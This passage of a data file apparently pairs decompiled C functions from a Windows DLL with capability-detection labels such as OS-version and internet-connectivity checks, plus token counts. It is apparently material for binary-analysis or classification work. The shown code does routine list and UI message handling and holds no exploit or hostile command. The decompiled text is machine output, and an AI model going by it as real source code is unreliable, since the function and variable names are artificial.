(iVar13 - iVar7) - 8U < 0x20)) {\n                fcn.18008fb24(iVar7);\n                goto code_r0x000180040ab3;\n            }\n            goto code_r0x000180040ccd;\n        }\ncode_r0x000180040ab3:\n        uStack56 = 0;\n        if (CONCAT44(uStack60, uStack64) < 8) {\ncode_r0x000180040b04:\n            fcn.180068600(*(arg1 + 0x18), 0x27f6);\n            goto code_r0x000180040b12;\n        }\n        iVar13 = CONCAT62(Stack86, uStack88);\n        iVar7 = iVar13;\n        if ((CONCAT44(uStack60, uStack64) * 2 + 2 < 0x1000) || (iVar7 = *(iVar13 + -8),  (iVar13 - iVar7) - 8U < 0x20))\n        {\n            fcn.18008fb24(iVar7);\n            goto code_r0x000180040b04;\n        }\n    }\n    fcn.1800b3528();\ncode_r0x000180040cd9:\n    fcn.1800b3528();\n    pcVar3 = swi(3);\n    (*pcVar3)();\n    return;\n}\n",
        "token_count": 4878
    },
    "18004329": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.180043290(int64_t arg1, ulong arg2)\n\n{\n    int32_t iVar1;\n    ulong ****ppppuVar2;\n    ulong arg2_00;\n    int64_t iVar3;\n    ulong ****arg1_00;\n    int64_t iVar4;\n    ulong *puVar5;\n    int64_t iVar6;\n    uchar auStack200 [32];\n    ulong uStack168;\n    ulong ****appppuStack152 [2];\n    ulong uStack136;\n    uint64_t uStack128;\n    ulong ****appppuStack120 [2];\n    ulong uStack104;\n    uint64_t uStack96;\n    uchar uStack88;\n    ulong ***pppuStack80;\n    ulong uStack72;\n    uint64_t uStack56;\n    \n    uStack168 = 0xfffffffffffffffe;\n    uStack56 = *0x180123080 ^ auStack200;\n    iVar1 = (**0x1800de7f0)(*(arg1 + 0x58), 0x188, 0, 0);\n    if (iVar1 != -1) {\n        if (arg2 == -1) {\n            if (iVar1 == 0) goto code_r0x000180043325;\n        }\n        else if ((arg2 != 1) || ((*(arg1 + 200) - *(arg1 + 0xc0)) / 0x60 + -1 <= iVar1)) goto code_r0x000180043325;\n        iVar3 = iVar1 * 0x60;\n        fcn.1800434a0(appppuStack152, *(arg1 + 0xc0) + iVar3);\n        iVar6 = arg2 + iVar1;\n        iVar4 = iVar6 * 0x60;\n        fcn.1800435d0(iVar3 + *(arg1 + 0xc0), iVar4 + *(arg1 + 0xc0));\n        arg1_00 = *(arg1 + 0xc0) + iVar4;\n        if (arg1_00 != appppuStack152) {\n            ppppuVar2 = appppuStack152;\n            if (0xf < uStack128) {\n                ppppuVar2 = appppuStack152[0];\n            }\n            fcn.180011120(arg1_00, ppppuVar2, uStack136);\n        }\n        if (arg1_00 + 4 != appppuStack120) {\n            ppppuVar2 = appppuStack120;\n            if (7 < uStack96) {\n                ppppuVar2 = appppuStack120[0];\n            }\n            fcn.180010d70(arg1_00 + 4, ppppuVar2, uStack104);\n        }\n        *(arg1_00 + 8) = uStack88;\n        if (arg1_00 + 9 != &pppuStack80) {\n            fcn.180049d40(arg1_00 + 9, pppuStack80, uStack72);\n        }\n        (**0x1800de7f0)(*(arg1 + 0x58), 0x182, iVar1, 0);\n        puVar5 = *(arg1 + 0xc0) + 0x20 + iVar4;\n        if (7 < puVar5[3]) {\n            puVar5 = *puVar5;\n        }\n        (**0x1800de7f0)(*(arg1 + 0x58), 0x181, iVar6, puVar5);\n        arg2_00 = 0x186;\n        (**0x1800de7f0)(*(arg1 + 0x58), 0x186, iVar6, 0);\n        *(arg1 + 0x51) = 0;\n        fcn.180040650(arg1);\n        fcn.180042fb0(arg1);\n        fcn.180048db0(&pppuStack80, arg2_00);\n        fcn.180042e30(appppuStack152);\n    }\ncode_r0x000180043325:\n    fcn.18008fb00(uStack56 ^ auStack200);\n    return;\n}\n",
        "token_count": 917
    },
    "18004365": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nulong fcn.180043650(int64_t arg1)\n\n{\n    int64_t *piVar1;\n    ulong *puVar2;\n    int32_t iVar3;\n    ulong uVar4;\n    char in_DL;\n    int64_t *piVar5;\n    ulong *arg2;\n    int64_t iVar6;\n    int64_t arg2_00;\n    int64_t iVar7;\n    \n    if (*(arg1 + 0x52) != '\\0') {\n        return 0;\n    }\n    iVar3 = (**0x1800de7f0)(*(arg1 + 0x58), 0x188, 0, 0);\n    if (iVar3 == -1) {\ncode_r0x0001800437d6:\n        uVar4 = 0xffffffff;\n    }\n    else {\n        iVar6 = iVar3;\n        arg2_00 = iVar6 * 0x60 + *(arg1 + 0xc0);\n        if (in_DL == '\\0') {\n            if (*(arg2_00 + 0x30) == 0) {\n                fcn.180043b50(arg1);\n                return 0;\n            }\n            fcn.180042f10(arg1, arg2_00);\n        }\n        else {\n            iVar3 = (**0x1800de7f0)(*(arg1 + 0x60), 0x147, 0, 0);\n            iVar7 = *(arg1 + 0x90);\n            if (*(arg1 + 0x98) - iVar7 >> 6 <= iVar3) goto code_r0x0001800437d6;\n            piVar5 = iVar3 * 0x40 + iVar7;\n            if (arg2_00 != piVar5) {\n                piVar1 = piVar5 + 2;\n                if (0xf < piVar5[3]) {\n                    piVar5 = *piVar5;\n                }\n                fcn.180011120(arg2_00, piVar5, *piVar1);\n                iVar7 = *(arg1 + 0x90);\n            }\n            arg2 = iVar3 * 0x40 + 0x20 + iVar7;\n            if (arg2_00 + 0x20 != arg2) {\n                puVar2 = arg2 + 2;\n                if (7 < arg2[3]) {\n                    arg2 = *arg2;\n                }\n                fcn.180010d70(arg2_00 + 0x20, arg2, *puVar2);\n            }\n            iVar3 = (**0x1800de740)(*(arg1 + 0x18), 0x27df);\n            *(arg2_00 + 0x40) = iVar3 == 1;\n        }\n        (**0x1800de7f0)(*(arg1 + 0x58), 0x182, iVar6, 0);\n        piVar5 = arg2_00 + 0x20;\n        if (7 < *(arg2_00 + 0x38)) {\n            piVar5 = *piVar5;\n        }\n        (**0x1800de7f0)(*(arg1 + 0x58), 0x181, iVar6, piVar5);\n        (**0x1800de7f0)(*(arg1 + 0x58), 0x186, iVar6, 0);\n        *(arg1 + 0x51) = 0x100;\n        fcn.180043070(arg1);\n        uVar4 = 1;\n    }\n    return uVar4;\n}\n",
        "token_count": 785
    },
    "18004443": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.180044430(int64_t arg1)\n\n{\n    uint64_t uVar1;\n    char cVar2;\n    bool bVar3;\n    code *pcVar4;\n    uint64_t uVar5;\n    uchar *puVar6;\n    uchar *puVar7;\n    uint *puVar8;\n    int64_t iVar9;\n    ulong uVar10;\n    ulong uVar11;\n    uint uVar12;\n    int64_t iVar13;\n    char cVar14;\n    ulong uVar15;\n    uchar *puVar16;\n    uchar *puVar17;\n    uchar *puVar18;\n    uint64_t unaff_R14;\n    ulong unaff_R15;\n    ushort uStack88;\n    unkbyte6 Stack86;\n    ulong uStack80;\n    uint64_t uStack72;\n    uint64_t uStack64;\n    ushort uStack56;\n    ushort uStack54;\n    uint uStack52;\n    uint uStack48;\n    uint uStack44;\n    ulong uStack40;\n    uint64_t uStack32;\n    \n    puVar7 = &stack0xffffffffffffffc8;\n    puVar16 = &stack0xffffffffffffffc8;\n    puVar17 = &stack0xffffffffffffffc8;\n    puVar18 = &stack0xffffffffffffffc8;\n    if ((*(arg1 + 0x53) == '\\0') || (*(arg1 + 0x54) == '\\0')) {\n        cVar14 = '\\0';\n    }\n    else {\n        cVar14 = '\\x01';\n    }\n    uStack64 = 0x18004447a;\n    iVar9 = (**0x1800de7f0)(*(arg1 + 0x68), 0x18b, 0, 0);\n    cVar2 = *(arg1 + 0x53);\n    bVar3 = 0 < iVar9;\n    iVar13 = *(arg1 + 0xb0) - *(arg1 + 0xa8) >> 6;\n    uStack64 = 0x1800444b0;\n    uVar10 = (**0x1800de798)(*(arg1 + 0x18), 0x27f8);\n    uStack64 = 0x1800444bb;\n    (**0x1800de718)(uVar10, -(cVar2 != '\\0') & 5);\n    uVar12 = 5;\n    if (*(arg1 + 0x53) != '\\0') {\n        uVar12 = 0;\n    }\n    uStack64 = 0x1800444da;\n    uVar10 = (**0x1800de798)(*(arg1 + 0x18), 0x27f7);\n    uStack64 = 0x1800444e5;\n    (**0x1800de718)(uVar10, uVar12);\n    uStack64 = 0x1800444f3;\n    (**0x1800de770)(*(arg1 + 0x68), cVar14);\n    uVar10 = 1;\n    if ((iVar9 < 1) || (uVar15 = uVar10,  iVar13 == 0)) {\n        uVar15 = 0;\n    }\n    uStack64 = 0x180044511;\n    (**0x1800de770)(*(arg1 + 0x70), uVar15);\n    if ((!bVar3) || (uVar15 = uVar10,  iVar13 == 0)) {\n        uVar15 = 0;\n    }\n    uStack64 = 0x18004452f;\n    uVar11 = (**0x1800de798)(*(arg1 + 0x18), 0x27f4);\n    uStack64 = 0x18004453a;\n    (**0x1800de770)(uVar11, uVar15);\n    if ((!bVar3) || (uVar15 = uVar10,  iVar13 == 0)) {\n        uVar15 = 0;\n    }\n    uStack64 = 0x180044558;\n    uVar11 = (**0x1800de798)(*(arg1 + 0x18), 0x27f5);\n    uStack64 = 0x180044563;\n    (**0x1800de770)(uVar11, uVar15);\n    if ((!bVar3) || (uVar15 = uVar10,  iVar13 == 0)) {\n        uVar15 = 0;\n    }\n    uStack64 = 0x180044581;\n    uVar11 = (**0x1800de798)(*(arg1 + 0x18), 0x27f6);\n    uStack64 = 0x18004458c;\n    (**0x1800de770)(uVar11, uVar15);\n    if ((iVar13 == 0) || (uVar15 = uVar10,  cVar14 == '\\0')) {\n        uVar15 = 0;\n    }\n    uStack64 = 0x1800445aa;\n    uVar11 = (**0x1800de798)(*(arg1 + 0x18), 0x27f8);\n    uStack64 = 0x1800445b5;\n    (**0x1800de770)(uVar11, uVar15);\n    if (((!bVar3) || (iVar13 == 0)) || (cVar14 == '\\0')) {\n        uVar10 = 0;\n    }\n    uStack64 = 0x1800445d6;\n    uVar15 = (**0x1800de798)(*(arg1 + 0x18), 0x27f9);\n    uStack64 = 0x1800445e1;\n    (**0x1800de770)(uVar15, uVar10);\n    uStack64 = 0x1800445f4;\n    uVar10 = (**0x1800de798)(*(arg1 + 0x18), 0x27fa);\n    uStack64 = 0x1800445ff;\n    (**0x1800de770)(uVar10, bVar3);\n    if (cVar14 == '\\0') {\n        uStack64 = 0x18004461d;\n        uVar10 = (**0x1800de798)(*(arg1 + 0x18), 0x27ef);\n        uStack64 = 0x180044628;\n        (**0x1800de770)(uVar10, 0);\n        uStack64 = 0x180044637;\n        uVar10 = (**0x1800de798)(*(arg1 + 0x18), 0x27f0);\n        uStack64 = 0x180044642;\n        (**0x1800de770)(uVar10, 0);\n        uStack40 = unaff_R15;\n        uStack32 = unaff_R14;\n    }\n    else {\n        uStack64 = 0x18004460c;\n        fcn.180044340(arg1);\n        uStack40 = unaff_R15;\n        uStack32 = unaff_R14;\n    }\n    if (((*(arg1 + 0x52) == '\\0') || (*(arg1 + 0x53) == '\\0')) || (*(arg1 + 0x54) == '\\0')) {\n        cVar14 = '\\0';\n    }\n    else {\n        cVar14 = '\\x01';\n    }\n    uStack80 = 0x1800430be;\n    iVar9 = (**0x1800de7f0)(*(arg1 + 0x58), 0x18b, 0, 0);\n    cVar2 = *(arg1 + 0x52);\n    iVar13 = *(arg1 + 0x98) - *(arg1 + 0x90) >> 6;\n    uStack80 = 0x1800430f1;\n    uVar10 = (**0x1800de798)(*(arg1 + 0x18), 0x27e2);\n    uStack80 = 0x1800430fc;\n    (**0x1800de718)(uVar10, -(cVar2 != '\\0') & 5);\n    uVar12 = 5;\n    if (*(arg1 + 0x52) != '\\0') {\n        uVar12 = 0;\n    }\n    uStack80 = 0x18004311b;\n    uVar10 = (**0x1800de798)(*(arg1 + 0x18), 0x27e1);\n    uStack80 = 0x180043126;\n    (**0x1800de718)(uVar10, uVar12);\n    uStack80 = 0x180043137;\n    (**0x1800de770)(*(arg1 + 0x58), cVar14);\n    uStack80 = 0x18004314f;\n    uVar10 = (**0x1800de798)(*(arg1 + 0x18), 0x27df);\n    uStack80 = 0x18004315a;\n    (**0x1800de770)(uVar10, iVar13 != 0);\n    uStack80 = 0x180043169;\n    uVar10 = (**0x1800de798)(*(arg1 + 0x18), 0x27e0);\n    uStack80 = 0x180043174;\n    (**0x1800de770)(uVar10, iVar13 != 0);\n    uVar10 = 1;\n    if ((iVar13 == 0) || (uVar15 = uVar10,  cVar14 == '\\0')) {\n        uVar15 = 0;\n    }\n    uStack80 = 0x180043196;\n    uVar11 = (**0x1800de798)(*(arg1 + 0x18), 0x27e2);\n    uStack80 = 0x1800431a1;\n    (**0x1800de770)(uVar11, uVar15);\n    if ((iVar13 == 0) || (cVar14 == '\\0')) {\n        uVar10 = 0;\n    }\n    uStack80 = 0x1800431bd;\n    uVar15 = (**0x1800de798)(*(arg1 + 0x18), 0x27e3);\n    uStack80 = 0x1800431c8;\n    (**0x1800de770)(uVar15, uVar10);\n    uStack80 = 0x1800431db;\n    uVar10 = (**0x1800de798)(*(arg1 + 0x18), 0x27e4);\n    uStack80 = 0x1800431e6;\n    (**0x1800de770)(uVar10, 0 < iVar9);\n    uStack80 = 0x1800431f5;\n    uVar10 = (**0x1800de798)(*(arg1 + 0x18), 0x2819);\n    uStack80 = 0x180043201;\n    (**0x1800de770)(uVar10, cVar14);\n    uStack80 = 0x180043210;\n    uVar10 = (**0x1800de798)(*(arg1 + 0x18), 0x281a);\n    uStack80 = 0x18004321c;\n    (**0x1800de770)(uVar10, cVar14);\n    if (cVar14 == '\\0') {\n        uStack80 = 0x18004323a;\n        uVar10 = (**0x1800de798)(*(arg1 + 0x18), 0x27db);\n        uStack80 = 0x180043245;\n        (**0x1800de770)(uVar10, 0);\n        uStack80 = 0x180043254;\n        uVar10 = (**0x1800de798)(*(arg1 + 0x18), 0x27dc);\n        uStack80 = 0x18004325f;\n        (**0x1800de770)(uVar10, 0);\n    }\n    else {\n        uStack80 = 0x180043229;\n        fcn.180042fb0(arg1);\n    }\n    if (*(arg1 + 0x51) == '\\0') {\n        uStack72 = CONCAT44(*0x180101904, *0x180101900);\n        uStack64 = CONCAT44(*0x18010190c, *0x180101908);\n        uStack88 = 0;\n        fcn.180010d70(&stack0xffffffffffffffa8, 0x1800f8150, 0x1d);\n        uVar5 = uStack72;\n        if (uStack64 == uStack72) {\n            puVar8 = fcn.180013690(&stack0xffffffffffffffa8, 1, 0, 0x1800f6ffc);\n        }\n        else {\n            uVar1 = uStack72 + 1;\n            uStack72 = uVar1;\n            puVar6 = &stack0xffffffffffffffa8;\n            if (7 < uStack64) {\n                puVar6 = CONCAT62(Stack86, uStack88);\n            }\n            *(puVar6 + uVar5 * 2) = 0x2a;\n            *(puVar6 + uVar1 * 2) = 0;\n            puVar8 = &stack0xffffffffffffffa8;\n        }\n        uStack56 = *puVar8;\n        uStack54 = *puVar8 >> 0x10;\n        uStack52 = puVar8[1];\n        uStack48 = puVar8[2];\n        uStack44 = puVar8[3];\n        uStack40 = *(puVar8 + 4);\n        uStack32 = *(puVar8 + 6);\n        *(puVar8 + 4) = 0;\n        *(puVar8 + 6) = 7;\n        *puVar8 = 0;\n        if (7 < uStack32) {\n            puVar7 = CONCAT44(uStack52, CONCAT22(uStack54, uStack56));\n        }\n        (**0x1800de788)(*(arg1 + 0x18), 0x2815, puVar7);\n        if (uStack32 < 8) {\ncode_r0x0001800407a3:\n            uStack40 = CONCAT44(*0x180101904, *0x180101900);\n            uStack32 = CONCAT44(*0x18010190c, *0x180101908);\n            uStack56 = 0;\n            if (uStack64 < 8) {\ncode_r0x0001800407f4:\n                fcn.180068600(*(arg1 + 0x18), 0x2815);\n                goto code_r0x000180040802;\n            }\n            iVar13 = CONCAT62(Stack86, uStack88);\n            iVar9 = iVar13;\n            if ((uStack64 * 2 + 2 < 0x1000) || (iVar9 = *(iVar13 + -8),  (iVar13 - iVar9) - 8U < 0x20)) {\n                fcn.18008fb24(iVar9);\n                goto code_r0x0001800407f4;\n            }\n        }\n        else {\n            iVar13 = CONCAT44(uStack52, CONCAT22(uStack54, uStack56));\n            iVar9 = iVar13;\n            if ((uStack32 * 2 + 2 < 0x1000) || (iVar9 = *(iVar13 + -8),  (iVar13 - iVar9) - 8U < 0x20)) {\n                fcn.18008fb24(iVar9);\n                goto code_r0x0001800407a3;\n            }\ncode_r0x000180040cb5:\n            fcn.1800b3528();\n        }\n        fcn.1800b3528();\ncode_r0x000180040cc1:\n        fcn.1800b3528();\ncode_r0x000180040cc7:\n        fcn.1800b3528();\ncode_r0x000180040ccd:\n        fcn.1800b3528();\n    }\n    else {\n        (**0x1800de788)(*(arg1 + 0x18), 0x2815, 0x1800f8110);\n        fcn.180068540(*(arg1 + 0x18), 0x2815);\ncode_r0x000180040802:\n        if (*(arg1 + 0x52) == '\\0') {\n            uStack72 = CONCAT44(*0x180101904, *0x180101900);\n            uStack64 = CONCAT44(*0x18010190c, *0x180101908);\n            uStack88 = 0;\n            fcn.180010d70(&stack0xffffffffffffffa8, 0x1800f81a0, 6);\n            uVar5 = uStack72;\n            if (uStack64 == uStack72) {\n                puVar8 = fcn.180013690(&stack0xffffffffffffffa8, 1, 0, 0x1800f70c4);\n            }\n            else {\n                uVar1 = uStack72 + 1;\n                uStack72 = uVar1;\n                puVar7 = &stack0xffffffffffffffa8;\n                if (7 < uStack64) {\n                    puVar7 = CONCAT62(Stack86, uStack88);\n                }\n                *(puVar7 + uVar5 * 2) = 0x2a;\n                *(puVar7 + uVar1 * 2) = 0;\n                puVar8 = &stack0xffffffffffffffa8;\n            }\n            uStack56 = *puVar8;\n            uStack54 = *puVar8 >> 0x10;\n            uStack52 = puVar8[1];\n            uStack48 = puVar8[2];\n            uStack44 = puVar8[3];\n            uStack40 = *(puVar8 + 4);\n            uStack32 = *(puVar8 + 6);\n            *(puVar8 + 4) = 0;\n            *(puVar8 + 6) = 7;\n            *puVar8 = 0;\n            if (7 < uStack32) {\n                puVar16 = CONCAT44(uStack52, CONCAT22(uStack54, uStack56));\n            }\n            (**0x1800de788)(*(arg1 + 0x18), 0x27e0, puVar16);\n            if (7 < uStack32) {\n                iVar13 = CONCAT44(uStack52, CONCAT22(uStack54, uStack56));\n                iVar9 = iVar13;\n                if ((uStack32 * 2 + 2 < 0x1000) || (iVar9 = *(iVar13 + -8),  (iVar13 - iVar9) - 8U < 0x20)) {\n                    fcn.18008fb24(iVar9);\n                    goto code_r0x00018004092b;\n                }\n                goto code_r0x000180040cc1;\n            }\ncode_r0x00018004092b:\n            uStack40 = CONCAT44(*0x180101904, *0x180101900);\n            uStack32 = CONCAT44(*0x18010190c, *0x180101908);\n            uStack56 = 0;\n            if (uStack64 < 8) {\ncode_r0x00018004097c:\n                fcn.180068600(*(arg1 + 0x18), 0x27e0);\n                goto code_r0x00018004098a;\n            }\n            iVar13 = CONCAT62(Stack86, uStack88);\n            iVar9 = iVar13;\n            if ((uStack64 * 2 + 2 < 0x1000) || (iVar9 = *(iVar13 + -8),  (iVar13 - iVar9) - 8U < 0x20)) {\n                fcn.18008fb24(iVar9);\n                goto code_r0x00018004097c;\n            }\n            goto code_r0x000180040cc7;\n        }\n        (**0x1800de788)(*(arg1 + 0x18), 0x27e0, 0x1800f8190);\n        fcn.180068540(*(arg1 + 0x18), 0x27e0);\ncode_r0x00018004098a:\n        if (*(arg1 + 0x53) != '\\0') {\n            (**0x1800de788)(*(arg1 + 0x18), 0x27f6, 0x1800f81b0);\n            fcn.180068540(*(arg1 + 0x18), 0x27f6);\ncode_r0x000180040b12:\n            if (*(arg1 + 0x54) != '\\0') {\n                (**0x1800de788)(*(arg1 + 0x18), 0x2807, 0x1800f81d0);\n                fcn.180068540(*(arg1 + 0x18), 0x2807);\n                return;\n            }\n            uStack72 = CONCAT44(*0x180101904, *0x180101900);\n            uStack64 = CONCAT44(*0x18010190c, *0x180101908);\n            uStack88 = 0;\n            fcn.180010d70(&stack0xffffffffffffffa8, 0x1800f81e0, 6);\n            uVar5 = uStack72;\n            if (uStack64 == uStack72) {\n                puVar8 = fcn.180013690(&stack0xffffffffffffffa8, 1, 0, 0x1800f7134);\n            }\n            else {\n                uVar1 = uStack72 + 1;\n                uStack72 = uVar1;\n                puVar7 = &stack0xffffffffffffffa8;\n                if (7 < uStack64) {\n                    puVar7 = CONCAT62(Stack86, uStack88);\n                }\n                *(puVar7 + uVar5 * 2) = 0x2a;\n                *(puVar7 + uVar1 * 2) = 0;\n                puVar8 = &stack0xffffffffffffffa8;\n            }\n            uStack56 = *puVar8;\n            uStack54 = *puVar8 >> 0x10;\n            uStack52 = puVar8[1];\n            uStack48 = puVar8[2];\n            uStack44 = puVar8[3];\n            uStack40 = *(puVar8 + 4);\n            uStack32 = *(puVar8 + 6);\n            *(puVar8 + 4) = 0;\n            *(puVar8 + 6) = 7;\n            *puVar8 = 0;\n            if (7 < uStack32) {\n                puVar18 = CONCAT44(uStack52, CONCAT22(uStack54, uStack56));\n            }\n            (**0x1800de788)(*(arg1 + 0x18), 0x2807, puVar18);\n            if (7 < uStack32) {\n                iVar13 = CONCAT44(uStack52, CONCAT22(uStack54, uStack56));\n                iVar9 = iVar13;\n                if ((0xfff < uStack32 * 2 + 2) && (iVar9 = *(iVar13 + -8),  0x1f < (iVar13 - iVar9) - 8U))\n                goto code_r0x000180040cd9;\n                fcn.18008fb24(iVar9);\n            }\n            uStack40 = CONCAT44(*0x180101904, *0x180101900);\n            uStack32 = CONCAT44(*0x18010190c, *0x180101908);\n            uStack56 = 0;\n            if (uStack64 < 8) goto code_r0x000180040c88;\n            iVar13 = CONCAT62(Stack86, uStack88);\n            iVar9 = iVar13;\n            if (0xfff < uStack64 * 2 + 2) {\n                iVar9 = *(iVar13 + -8);\n                if (0x1f < (iVar13 - iVar9) - 8U) {\n                    fcn.1800b3528(uStack40, iVar9, uStack64 * 2 + 0x29);\n                    goto code_r0x000180040cb5;\n                }\n            }\n            fcn.18008fb24(iVar9);\ncode_r0x000180040c88:\n            fcn.180068600(*(arg1 + 0x18), 0x2807);\n            return;\n        }\n        uStack72 = CONCAT44(*0x180101904, *0x180101900);\n        uStack64 = CONCAT44(*0x18010190c, *0x180101908);\n        uStack88 = 0;\n        fcn.180010d70(&stack0xffffffffffffffa8, 0x1800f81c0, 6);\n        uVar5 = uStack72;\n        if (uStack64 == uStack72) {\n            puVar8 = fcn.180013690(&stack0xffffffffffffffa8, 1, 0, 0x1800f70dc);\n        }\n        else {\n            uVar1 = uStack72 + 1;\n            uStack72 = uVar1;\n            puVar7 = &stack0xffffffffffffffa8;\n            if (7 < uStack64) {\n                puVar7 = CONCAT62(Stack86, uStack88);\n            }\n            *(puVar7 + uVar5 * 2) = 0x2a;\n            *(puVar7 + uVar1 * 2) = 0;\n            puVar8 = &stack0xffffffffffffffa8;\n        }\n        uStack56 = *puVar8;\n        uStack54 = *puVar8 >> 0x10;\n        uStack52 = puVar8[1];\n        uStack48 = puVar8[2];\n        uStack44 = puVar8[3];\n        uStack40 = *(puVar8 + 4);\n        uStack32 = *(puVar8 + 6);\n        *(puVar8 + 4) = 0;\n        *(puVar8 + 6) = 7;\n        *puVar8 = 0;\n        if (7 < uStack32) {\n            puVar17 = CONCAT44(uStack52, CONCAT22(uStack54, uStack56));\n        }\n        (**0x1800de788)(*(arg1 + 0x18), 0x27f6, puVar17);\n        if (7 < uStack32) {\n            iVar13 = CONCAT44(uStack52, CONCAT22(uStack54, uStack56));\n            iVar9 = iVar13;\n            if ((uStack32 * 2 + 2 < 0x1000) || (iVar9 = *(iVar13 + -8),  (iVar13 - iVar9) - 8U < 0x20)) {\n                fcn.18008fb24(iVar9);\n                goto code_r0x000180040ab3;\n            }\n            goto code_r0x000180040ccd;\n        }\ncode_r0x000180040ab3:\n        uStack40 = CONCAT44(*0x180101904, *0x180101900);\n        uStack32 = CONCAT44(*0x18010190c, *0x180101908);\n        uStack56 = 0;\n        if (uStack64 < 8) {\ncode_r0x000180040b04:\n            fcn.180068600(*(arg1 + 0x18), 0x27f6);\n            goto code_r0x000180040b12;\n        }\n        iVar13 = CONCAT62(Stack86, uStack88);\n        iVar9 = iVar13;\n        if ((uStack64 * 2 + 2 < 0x1000) || (iVar9 = *(iVar13 + -8),  (iVar13 - iVar9) - 8U < 0x20)) {\n            fcn.18008fb24(iVar9);\n            goto code_r0x000180040b04;\n        }\n    }\n    fcn.1800b3528();\ncode_r0x000180040cd9:\n    fcn.1800b3528();\n    pcVar4 = swi(3);\n    (*pcVar4)();\n    return;\n}\n",
        "token_count": 6292
    },
    "18004467": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.180044670(int64_t arg1, ulong arg2)\n\n{\n    int64_t *piVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int64_t *piVar4;\n    ulong ****ppppuVar5;\n    int64_t iVar6;\n    ulong ****arg1_00;\n    int64_t iVar7;\n    ulong *puVar8;\n    int64_t iVar9;\n    int64_t iVar10;\n    uchar auStack216 [32];\n    ulong uStack184;\n    ulong ****appppuStack168 [2];\n    ulong uStack152;\n    uint64_t uStack144;\n    ulong ****appppuStack136 [2];\n    ulong uStack120;\n    uint64_t uStack112;\n    uint uStack104;\n    uchar uStack100;\n    ulong ***pppuStack96;\n    ulong uStack88;\n    uint64_t uStack72;\n    \n    uStack184 = 0xfffffffffffffffe;\n    uStack72 = *0x180123080 ^ auStack216;\n    iVar2 = (**0x1800de7f0)(*(arg1 + 0x58), 0x188, 0, 0);\n    if ((iVar2 != -1) && (iVar3 = (**0x1800de7f0)(*(arg1 + 0x68), 0x188, 0, 0),  iVar3 != -1)) {\n        iVar10 = iVar2 * 0x60 + *(arg1 + 0xc0);\n        if (arg2 == -1) {\n            if (iVar3 == 0) goto code_r0x000180044732;\n        }\n        else if ((arg2 != 1) || ((*(iVar10 + 0x50) - *(iVar10 + 0x48)) / 0x60 + -1 <= iVar3)) goto code_r0x000180044732;\n        iVar6 = iVar3 * 0x60;\n        fcn.180043fe0(appppuStack168, *(iVar10 + 0x48) + iVar6);\n        iVar7 = arg2 + iVar3;\n        iVar9 = iVar7 * 0x60;\n        piVar1 = iVar9 + *(iVar10 + 0x48);\n        iVar6 = iVar6 + *(iVar10 + 0x48);\n        if (iVar6 != piVar1) {\n            piVar4 = piVar1;\n            if (0xf < piVar1[3]) {\n                piVar4 = *piVar1;\n            }\n            fcn.180011120(iVar6, piVar4, piVar1[2]);\n        }\n        piVar4 = piVar1 + 4;\n        if (iVar6 + 0x20 != piVar4) {\n            if (7 < piVar1[7]) {\n                piVar4 = *piVar4;\n            }\n            fcn.180010d70(iVar6 + 0x20, piVar4, piVar1[6]);\n        }\n        *(iVar6 + 0x40) = *(piVar1 + 8);\n        *(iVar6 + 0x44) = *(piVar1 + 0x44);\n        if (iVar6 + 0x48 != piVar1 + 9) {\n            fcn.180049f50(iVar6 + 0x48, piVar1[9], piVar1[10]);\n        }\n        arg1_00 = *(iVar10 + 0x48) + iVar9;\n        if (arg1_00 != appppuStack168) {\n            ppppuVar5 = appppuStack168;\n            if (0xf < uStack144) {\n                ppppuVar5 = appppuStack168[0];\n            }\n            fcn.180011120(arg1_00, ppppuVar5, uStack152);\n        }\n        if (arg1_00 + 4 != appppuStack136) {\n            ppppuVar5 = appppuStack136;\n            if (7 < uStack112) {\n                ppppuVar5 = appppuStack136[0];\n            }\n            fcn.180010d70(arg1_00 + 4, ppppuVar5, uStack120);\n        }\n        *(arg1_00 + 8) = uStack104;\n        *(arg1_00 + 0x44) = uStack100;\n        if (arg1_00 + 9 != &pppuStack96) {\n            fcn.180049f50(arg1_00 + 9, pppuStack96, uStack88);\n        }\n        (**0x1800de7f0)(*(arg1 + 0x68), 0x182, iVar3, 0);\n        puVar8 = *(iVar10 + 0x48) + 0x20 + iVar9;\n        if (7 < puVar8[3]) {\n            puVar8 = *puVar8;\n        }\n        (**0x1800de7f0)(*(arg1 + 0x68), 0x181, iVar7, puVar8);\n        (**0x1800de7f0)(*(arg1 + 0x68), 0x186, iVar7, 0);\n        *(arg1 + 0x51) = 0;\n        fcn.180040650(arg1);\n        fcn.180044340(arg1);\n        fcn.180048ec0(&pppuStack96);\n        fcn.180042e30(appppuStack168);\n    }\ncode_r0x000180044732:\n    fcn.18008fb00(uStack72 ^ auStack216);\n    return;\n}\n",
        "token_count": 1250
    },
    "18004491": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
